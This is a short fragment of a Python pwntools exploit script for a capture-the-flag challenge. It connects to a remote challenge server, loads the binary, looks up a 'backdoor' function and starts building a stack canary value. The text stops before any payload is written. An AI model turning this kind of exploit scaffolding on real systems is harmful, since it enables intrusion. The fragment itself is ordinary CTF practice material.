from pwn import *
#context.log_level = 'debug'
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28191)
elf = ELF('./pwn')
backdoor = elf.sym['backdoor']
canary = '\x00'
